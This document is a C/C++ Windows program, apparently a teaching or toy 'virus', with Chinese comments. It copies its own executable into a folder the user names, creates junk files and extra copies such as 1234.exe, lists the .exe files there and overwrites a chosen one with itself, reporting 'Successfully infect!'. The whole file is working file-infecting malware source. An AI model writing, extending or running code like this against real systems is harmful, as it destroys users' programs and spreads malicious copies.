#include<stdio.h>
#include<io.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>
#include<iostream>
#include<fstream>
#include<ios>
#include<Windows.h>
using namespace std;

#define MAXSIZE 4096
# define BUFFER_SIZE 4
#define MAXPATH 1024


char INFECT_PATH[100], DELETE_FILE1[100], DELETE_FILE2[100], DELETE_FILE3[100], DELETE_FILE4[100], CREAT_EXE1[100], CREAT_EXE2[100], Virusfile[100], Targetfile[100],dest[100],path[100][260] ;
void LitterFile(void);
void Createxe(void);
void Remove(void);
void CopyFile(char* infile, char* outfile);

// 文件复制函数
void CopyFile(char* infile, char* outfile)
{
    FILE *in, *out;
    in = fopen(infile, "r");
    out = fopen(outfile, "w");
    while (!feof(in)) {
        fputc(fgetc(in), out);
    }
    fclose(in);
    fclose(out);
}
// 创建垃圾文件的函数
void LitterFile(void)  
{
    for (int j = 1; j <= 5; j++) {
        int i = 0;
        FILE *fp = NULL;
        char* path = NULL;
        char* NewName = NULL;
        char tempname[] = "XXXXXX";
        path = INFECT_PATH;   
        NewName = _mktemp(tempname);  // 创建一个临时文件名
        fp = fopen(NewName, "w");  // 创建文件
        fclose(fp);  // 关闭文件
    }
}
// 查找目录下的exe文件
int exe() {
    long Handle;
    char findstr[100];
    strcpy(findstr, dest);
    strcat(findstr, "\\*.exe");
    struct _finddata_t FileInfo;
    if ((Handle = _findfirst(findstr, &FileInfo)) == -1L)
        printf("Dismatched!\n");
    else {
        int i = 1;
        strcpy(path[i], FileInfo.name);
        printf("%d %s\n", i, FileInfo.name);
        i++;
        while (_findnext(Handle, &FileInfo) == 0) {
            strcpy(path[i], FileInfo.name);
            printf("%d %s\n", i, FileInfo.name);
            i++; 
        }
        _findclose(Handle);
    }

    getchar();

    return 0;
}


// 创建可执行文件的函数
void Createxe(void)  
{
    int i;
    char* s[2] = {CREAT_EXE1, CREAT_EXE2};  // 定义要创建的两个exe文件名
    for (i = 0; i < 2; i++) {
        open(s[i], 0x0100, 0x0080);  // 创建文件
        CopyFile(Virusfile, s[i]);  // 将病毒文件复制到新创建的exe文件中
    }
}




// 主函数
int main(void)
{
    strcpy(Virusfile, _pgmptr);  // 获取病毒文件路径
    int N=3;
    printf("The virus is starting to infect\n");
    int flag;
    do {
        printf("Enter the infected target folder：\n");
        scanf("%s", &dest);
        flag = access(dest, 0);  
        if (flag != 0)  printf("Please re-enter the infected target folder：\n");
    } while (flag != 0);
    // 设置文件路径
    strcpy(INFECT_PATH, dest);
    strcpy(CREAT_EXE1, dest);
    strcat(CREAT_EXE1, "\\1234.exe");
    strcpy(Targetfile, dest);
    strcat(Targetfile, "\\test.exe");
    char stri[2];
    for (int i = 1; i <= N; i++) {
        char Target[100];
        char tmpBuf[4096] = { 0 };
        strcpy(Target, dest);  
        strcat(Target, "\\litterFile");
        itoa(i, stri, 10); 
        strcat(Target, stri);   
        strcat(Target, ".exe");
        FILE *fp1 = fopen(Virusfile, "rb");   
        FILE *fp2 = fopen(Target, "wb");   
        int count = 0;
        while ((count = fread(tmpBuf, sizeof(char), BUFFER_SIZE, fp1))) {
            fwrite(tmpBuf, sizeof(char), count, fp2);
        }
        fclose(fp1);
        fclose(fp2);
    }
    printf("Successfully Copy！\n");	
    LitterFile();        
    Createxe();         
    printf("在The following exe file was found in the directory. Please enter the file number to be infected\n");
    exe();
    int num;
    scanf("%d", &num);
    if (num == 0) {
        system("pause");
        return 0;
    }
    char Target[100];
    char tmpBuf[4096] = { 0 };
    strcpy(Target, dest);
    strcat(Target, "\\");
    strcat(Target, path[num]);
    FILE *fp1 = fopen(Virusfile, "rb");
    FILE *fp2 = fopen(Target, "wb");
    int count = 0;
    while ((count = fread(tmpBuf, sizeof(char), BUFFER_SIZE, fp1))) {
        fwrite(tmpBuf, sizeof(char), count, fp2);
    }
    fclose(fp1);
    fclose(fp2);
    printf("Successfully infect!\n"); 
    system("pause");
    return 0;
}

